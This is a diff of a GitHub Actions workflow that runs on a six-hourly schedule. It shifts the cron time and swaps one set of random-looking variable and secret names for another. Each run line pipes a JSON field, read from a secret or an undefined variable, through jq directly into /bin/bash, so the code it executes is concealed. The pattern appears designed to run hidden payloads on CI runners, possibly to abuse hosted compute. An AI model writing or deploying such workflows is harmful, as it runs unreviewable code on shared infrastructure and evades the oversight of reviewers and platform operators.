@@ -1,8 +1,10 @@
 name: pengzhongzhou2013
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '42 4/6 * * *'
+    - cron: '47 3/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -10,18 +12,16 @@ jobs:
       - uses: actions/checkout@v4
       - name: pengzhongzhou2013
         env:
-          fdin46036: ${{ secrets.fdin46036 }}
+          zq62773: ${{ secrets.zq62773 }}
         run: |
-          echo $fdin46036 | jq -r .i5 | /bin/bash
-          echo $l9945 | jq -r .mfbdf11375 | /bin/bash
-          echo $vi487 | jq -r .dagp238 | /bin/bash
-          echo $mpu859 | jq -r .n0 | /bin/bash
-          echo $onswn04 | jq -r .tuit1124 | /bin/bash
-          echo $sz9742 | jq -r .tylo2203 | /bin/bash
-          echo $hklw33497 | jq -r .dwlg227 | /bin/bash
-          echo $j88359 | jq -r .qcv38054 | /bin/bash
-          echo $ssck3 | jq -r .osh935 | /bin/bash
-          echo $ycq43 | jq -r .abu6563 | /bin/bash
-          echo $pm2766 | jq -r .jyed79090 | /bin/bash
-          echo $teydt32431 | jq -r .ukxxs621 | /bin/bash
+          echo $zq62773 | jq -r .a764 | /bin/bash
+          echo $axu8 | jq -r .rcg4 | /bin/bash
+          echo $sh55697 | jq -r .b7060 | /bin/bash
+          echo $pr4 | jq -r .kydwb043 | /bin/bash
+          echo $xnhle974 | jq -r .u50332 | /bin/bash
+          echo $rt4 | jq -r .wqklv3585 | /bin/bash
+          echo $gkvd244 | jq -r .if3 | /bin/bash
+          echo $jvv67 | jq -r .aqsa75981 | /bin/bash
+          echo $d1118 | jq -r .rmf594 | /bin/bash
+          echo $dh96674 | jq -r .d9674 | /bin/bash
 
